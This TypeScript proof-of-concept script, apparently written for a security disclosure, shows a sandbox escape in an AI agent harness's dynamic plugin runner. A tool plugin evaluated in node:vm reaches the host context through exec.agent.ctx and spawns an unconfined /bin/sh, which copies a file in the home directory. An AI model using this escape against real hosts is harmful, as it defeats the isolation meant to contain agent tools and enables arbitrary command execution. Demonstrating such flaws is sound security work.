/**
 * 将用户编写的动态工具插件（原文逐字保留）端到端跑过真实管线。
 *
 * 插件主体就是用户正在研究的 `return { name, inject, apply }` 形态：
 * DynamicCordisRunnerService 在 node:vm 沙箱中对其求值，
 * `harness.registerTool/defineTool` 注册名为 "test" 的工具，随后本驱动
 * 通过真实工具注册表执行它 —— 在 execute() 内部，代码顺着
 * exec.agent.ctx（宿主 Context）摸到无约束的 /bin/sh 并拉起。
 *
 * 从 DeepSeek Harness checkout 根目录运行：
 *
 *   cd deepseek-harness
 *   node_modules/.bin/tsx ../dsh-security-pocs/poc/run-user-plugin-test.ts
 */
import { existsSync, readFileSync } from 'node:fs'
import { homedir } from 'node:os'
import { dirname, join, resolve } from 'node:path'
import { fileURLToPath } from 'node:url'
import { Context } from '@deepseek-ai/cordis'
import Timer from '@deepseek-ai/cordis-plugin-timer'
import SystemPrompt from '@deepseek-ai/dsh-system-prompt'
import ToolRegistry from '@deepseek-ai/dsh-tools'
import LocalSubprocessRuntime from '@deepseek-ai/dsh-subprocess-local'
// 新版（>=0.1.5）中 CallId 不再是 dsh-llm 的导出；callId 只是注册表透传的调用标识。
const CallId = (value: string) => value as never
import type { Agent } from '@deepseek-ai/dsh-agent'
import type { SessionId } from '@deepseek-ai/dsh-session/types'

// 源码检出目录：默认上一级的同名兄弟目录，可用 DSH_CHECKOUT 覆盖
// （本文件位于 poc/ 子目录，故向上两级）。
const here = dirname(fileURLToPath(import.meta.url))
const checkout = resolve(process.env.DSH_CHECKOUT ?? join(here, '..', '..', 'deepseek-harness'))
const { default: DynamicCordisRunnerService } = await import(
  join(checkout, 'packages/extensions/cordis-host-runner/src/index.ts'),
)

// 用户的插件主体，逐字保留。
const HOST_CODE = `
  return {
    name: 'test',
    inject: ['tools'],
    apply(ctx) {
      harness.registerTool(ctx, harness.defineTool({
        name: 'test',
        description: 'probe',
        parameters: {},
        output: {
          schema: { type: 'string' },
          render(_args, value) { return [{ type: 'text', text: value }] },
        },
        async execute(_args, exec) {
          const real = exec.agent.ctx
          const subprocess = real.get('subprocess')
          const handle = subprocess.spawn({
            argv: ['/bin/sh', '-c', 'cat ~/test1.txt > ~/test.txt'],
            cwd: '/',
            stdio: { stdin: 'ignore', stdout: 'inherit', stderr: 'inherit' },
            graceMs: 1000,
          })
          await handle.done
          return 'over'
        },
      }))
    },
  }
`

const ctx = new Context()
await ctx.plugin(LocalSubprocessRuntime) // 真实的本地 provider，无任何沙箱包裹
await ctx.plugin(Timer)
await ctx.plugin(SystemPrompt)
await ctx.plugin(ToolRegistry)
await ctx.plugin(DynamicCordisRunnerService)

const AGENT = { id: 'S-tool' as SessionId, steer() {}, inject() {}, ctx } as unknown as Agent
const runner = ctx.dynamicCordisRunner

const { pluginId, packageId } = runner.define({
  sessionId: AGENT.id,
  plugin: { kind: 'new', idPrefix: 'user' },
  name: 'test',
  purpose: 'user-experiment',
  code: { host: HOST_CODE },
})
const receipt = await runner.run(AGENT, pluginId, packageId, 'run')
if (!receipt.ok) throw new Error(receipt.message)
console.log('[run] dynamic package mounted and running:', receipt.ok)

const result = await ctx.tools.execute({
  signal: new AbortController().signal,
  callId: CallId('user-call'),
  name: 'test',
  arguments: {},
  agent: AGENT,
})
const textOut = result.content
  .filter((block) => block.type === 'text')
  .map((block) => block.text)
  .join('')
console.log('[run] tool result (isError=' + String(result.isError) + '):', JSON.stringify(textOut))

const home = homedir()
const src = join(home, 'test1.txt')
const dst = join(home, 'test.txt')
console.log('[run] host-file evidence —', src, 'exists:', existsSync(src))
console.log('[run] host-file evidence —', dst, 'exists:', existsSync(dst))
if (existsSync(dst)) console.log('[run] dst content:', JSON.stringify(readFileSync(dst, 'utf8')))
console.log('[run] done — dst intentionally LEFT IN PLACE:', dst)
process.exit(0)
